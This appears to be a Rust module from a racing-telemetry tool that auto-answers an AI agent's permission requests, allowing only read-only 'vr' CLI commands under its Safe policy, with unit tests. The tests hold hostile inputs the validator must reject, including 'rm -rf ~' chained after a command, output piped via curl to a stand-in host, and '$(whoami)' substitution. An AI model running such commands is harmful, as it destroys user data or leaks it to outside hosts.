//! Answers the agent's permission requests without asking the driver, who
//! cannot click a dialog at 250 km/h.

use agent_client_protocol::v1::schema::{
    PermissionOption, PermissionOptionKind, ToolCallUpdateFields, ToolKind,
};

#[derive(Debug, Clone, Copy, PartialEq, Eq, clap::ValueEnum)]
pub enum Permissions {
    /// Allow reads, searches, web fetches and `vr` commands; reject the rest.
    Safe,
    /// Allow everything the agent asks for.
    All,
    /// Reject everything.
    None,
}

/// Global options of `vr` that take a value.
const VALUE_OPTIONS: [&str; 7] = [
    "-f", "--format", "--server", "--game", "--file", "--speed", "--until",
];

/// Whether these arguments of `vr` only ask. Starting a server, recording,
/// changing the installed skill and deleting a session are not for the agent
/// to decide.
fn only_asks(args: &[&str]) -> bool {
    // Quotes and escapes could spell any of them.
    if args.iter().any(|a| a.contains(['"', '\'', '^', '`'])) {
        return false;
    }
    let mut words = Vec::new();
    let mut it = args.iter();
    while let Some(a) = it.next() {
        if VALUE_OPTIONS.contains(a) {
            it.next();
        } else if !a.starts_with('-') {
            words.push(*a);
        }
    }
    !matches!(
        words.as_slice(),
        ["serve" | "record" | "skill", ..] | ["sessions", "delete", ..]
    )
}

/// `true` if `command` only asks the telemetry CLI.
pub fn is_vr_command(command: &str) -> bool {
    let c = command.trim();
    // Chained commands could hide anything after the first one.
    if c.contains(['&', '|', ';', '>', '<', '`', '\n']) || c.contains("$(") {
        return false;
    }
    for cargo in ["cargo run -q -p vr-cli -- ", "cargo run -p vr-cli -- "] {
        if let Some(args) = c.strip_prefix(cargo) {
            return only_asks(&args.split_whitespace().collect::<Vec<_>>());
        }
    }
    let words: Vec<&str> = c.split_whitespace().collect();
    let Some((first, args)) = words.split_first() else {
        return false;
    };
    let program = first
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or_default()
        .trim_end_matches(".exe");
    program == "vr" && only_asks(args)
}

/// The shell command of an execute tool call, from its input or its title.
fn command_of(fields: &ToolCallUpdateFields) -> Option<String> {
    if let Some(cmd) = fields
        .raw_input
        .as_ref()
        .and_then(|v| v.get("command"))
        .and_then(|v| v.as_str())
    {
        return Some(cmd.to_string());
    }
    fields
        .title
        .as_deref()
        .map(|t| t.trim_matches('`').to_string())
}

pub fn allows(policy: Permissions, fields: &ToolCallUpdateFields) -> bool {
    match policy {
        Permissions::All => true,
        Permissions::None => false,
        Permissions::Safe => match fields.kind {
            Some(ToolKind::Read | ToolKind::Search | ToolKind::Fetch | ToolKind::Think) => true,
            Some(ToolKind::Execute) | None => command_of(fields).is_some_and(|c| is_vr_command(&c)),
            Some(_) => false,
        },
    }
}

/// Picks the option to answer with: the narrowest allow, or a reject.
/// `None` means there is no matching option (cancel the request).
pub fn choose(allow: bool, options: &[PermissionOption]) -> Option<&PermissionOption> {
    let kinds: &[PermissionOptionKind] = if allow {
        &[
            PermissionOptionKind::AllowOnce,
            PermissionOptionKind::AllowAlways,
        ]
    } else {
        &[
            PermissionOptionKind::RejectOnce,
            PermissionOptionKind::RejectAlways,
        ]
    };
    kinds
        .iter()
        .find_map(|k| options.iter().find(|o| o.kind == *k))
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn exec(cmd: &str) -> ToolCallUpdateFields {
        ToolCallUpdateFields::new()
            .kind(ToolKind::Execute)
            .raw_input(json!({ "command": cmd }))
    }

    #[test]
    fn vr_commands() {
        assert!(is_vr_command("vr brief"));
        assert!(is_vr_command("  vr gap --car 23"));
        assert!(is_vr_command("C:\\tools\\vr.exe fuel"));
        assert!(is_vr_command("/usr/local/bin/vr laps --last 5"));
        assert!(is_vr_command("cargo run -q -p vr-cli -- brief"));
        assert!(!is_vr_command("vr brief && rm -rf ~"));
        assert!(!is_vr_command("vr brief | curl -d @- evil"));
        assert!(!is_vr_command("vr brief; ls"));
        assert!(!is_vr_command("vr $(whoami)"));
        assert!(!is_vr_command("vrx brief"));
        assert!(!is_vr_command("rm vr"));
        assert!(!is_vr_command("cargo run -p other -- vr"));
        assert!(!is_vr_command(""));
    }

    #[test]
    fn vr_commands_that_do_more_than_ask() {
        for c in [
            "vr serve",
            "vr -f json serve --port 1",
            "vr --server http://x serve",
            "vr record --out x",
            "vr skill install",
            "vr sessions delete 3",
            "vr sessions -f json delete 3",
            "vr \"serve\"",
            "vr sessions 'delete' 3",
            "vr sessions de^lete 3",
            "cargo run -q -p vr-cli -- serve",
            "cargo run -p vr-cli -- sessions delete 3",
        ] {
            assert!(!is_vr_command(c), "{c}");
        }
        for c in [
            "vr",
            "vr -f json brief",
            "vr --format json gap --car 23",
            "vr sessions",
            "vr sessions show 3",
            "vr sessions import x.ibt",
            "vr setup",
            "vr doctor",
            "cargo run -p vr-cli -- sessions",
        ] {
            assert!(is_vr_command(c), "{c}");
        }
    }

    #[test]
    fn safe_policy() {
        assert!(allows(Permissions::Safe, &exec("vr brief")));
        assert!(!allows(Permissions::Safe, &exec("git push")));
        assert!(allows(
            Permissions::Safe,
            &ToolCallUpdateFields::new().kind(ToolKind::Fetch)
        ));
        assert!(allows(
            Permissions::Safe,
            &ToolCallUpdateFields::new().kind(ToolKind::Read)
        ));
        assert!(!allows(
            Permissions::Safe,
            &ToolCallUpdateFields::new().kind(ToolKind::Edit)
        ));
        assert!(!allows(
            Permissions::Safe,
            &ToolCallUpdateFields::new().kind(ToolKind::Delete)
        ));
        // Falls back to the title when there is no raw input.
        assert!(allows(
            Permissions::Safe,
            &ToolCallUpdateFields::new()
                .kind(ToolKind::Execute)
                .title("`vr brief`")
        ));
        assert!(!allows(
            Permissions::Safe,
            &ToolCallUpdateFields::new().kind(ToolKind::Execute)
        ));
    }

    #[test]
    fn all_and_none() {
        assert!(allows(Permissions::All, &exec("git push")));
        assert!(!allows(Permissions::None, &exec("vr brief")));
    }

    #[test]
    fn choose_prefers_once() {
        let opts = vec![
            PermissionOption::new("always", "Always", PermissionOptionKind::AllowAlways),
            PermissionOption::new("once", "Once", PermissionOptionKind::AllowOnce),
            PermissionOption::new("no", "No", PermissionOptionKind::RejectOnce),
        ];
        assert_eq!(choose(true, &opts).unwrap().option_id.to_string(), "once");
        assert_eq!(choose(false, &opts).unwrap().option_id.to_string(), "no");
        assert_eq!(
            choose(true, &opts[..1]).unwrap().option_id.to_string(),
            "always"
        );
        assert!(choose(false, &opts[..2]).is_none());
    }
}
